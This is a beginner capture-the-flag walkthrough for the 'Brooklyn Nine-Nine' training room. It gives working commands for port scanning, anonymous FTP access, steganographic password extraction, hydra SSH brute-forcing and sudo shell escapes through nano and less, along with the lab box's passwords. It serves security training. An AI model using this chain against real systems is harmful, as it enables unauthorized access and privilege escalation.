Brooklyn Nine-Nine user-fiendly THM Walkthrough
Room: Brooklyn Nine-Nine
Difficulty: Easy
Creator: Fsociety2006
Objective: Find the user flag and root flag.

This CTF is based on the popular TV series Brooklyn Nine-Nine. It’s a beginner-friendly box that teaches FTP enumeration, steganography, SSH brute-forcing, and two different paths for privilege escalation.

Step 1: Reconnaissance
The first step is to identify open ports and running services on the target machine.


nmap -sC -sV -p- <target-ip> -oN scan.txt
Nmap results:

21/tcp FTP vsftpd 3.0.3
22/tcp SSH OpenSSH 7.6p1 Ubuntu
80/tcp HTTP Apache httpd 2.4.29 ((Ubuntu))

Three ports are open. Anonymous login is enabled on FTP.

Step 2: Web Enumeration
Visiting http://<target-ip> displays a single image of the Brooklyn Nine-Nine cast. Nothing else is visible on the page.

Viewing the page source (Ctrl+U) reveals a comment:

"Have you ever heard of steganography?"

This is a strong hint that the image might contain hidden data.

Step 3: FTP Enumeration
FTP allows anonymous login (username: anonymous, password: blank). Let’s connect and check what’s there.


ftp <target-ip>
# Username: anonymous
# Password: (blank)
Inside the FTP directory, there is a file named note_to_jake.txt.


get note_to_jake.txt
cat note_to_jake.txt
Content of note_to_jake.txt:

"From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine."

This tells us three user accounts exist (jake, holt, amy) and that Jake’s password is weak.

Step 4: Steganography
Based on the hint in the page source, the brooklyn99.jpg image likely contains hidden data. Let’s download it and extract the hidden content using steghide.


wget http://<target-ip>/brooklyn99.jpg
steghide extract -sf brooklyn99.jpg
When prompted for a passphrase, leave it blank and press Enter. It extracts a file called note.txt.


cat note.txt
Output:
Holt's password: fluffydog12@ninenine

Now we have valid SSH credentials for user holt!

Step 5: SSH Access (User Flag)
Use the credentials to log in via SSH.


ssh holt@<target-ip>
Once logged in, check holt’s home directory.


ls -la
cat user.txt
This gives us the user flag.

Step 6: Privilege Escalation to Root
Now that we have access to holt, let’s check which commands holt can run with sudo.


sudo -l
Output:
User holt may run the following commands on brooklyn99: (ALL) NOPASSWD: /bin/nano

We can run nano as root. This is a privilege escalation vector. According to GTFOBins, we can exploit nano to spawn a root shell:

Run sudo nano

Inside nano, press Ctrl+R (read file)

Press Ctrl+X (execute command)

Enter: reset; sh 1>&0 2>&0


sudo /bin/nano
# Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
You are now root! Verify with id or whoami.

Step 7: Root Flag
Navigate to the root directory and read the flag.


cd /root
cat root.txt
This gives us the root flag.

Alternative Path: Brute-Forcing Jake’s Password
If you prefer a different approach, you can also brute-force Jake’s SSH password using hydra.


hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
The password is 987654321. Once logged in, check sudo -l — Jake can run less as root.


sudo -l
# (ALL) NOPASSWD: /usr/bin/less
From there, use this GTFOBins command to get root access:


sudo less /etc/profile
!/bin/sh
This spawns a root shell and allows you to capture the same root flag.

Conclusion
The Brooklyn Nine-Nine room is a great beginner CTF that covers:

Port scanning with Nmap
Anonymous FTP enumeration
Web source inspection
Image steganography with steghide
SSH brute-forcing with hydra
Two distinct privilege escalation vectors (nano and less) using GTFOBins
Capturing user and root flags


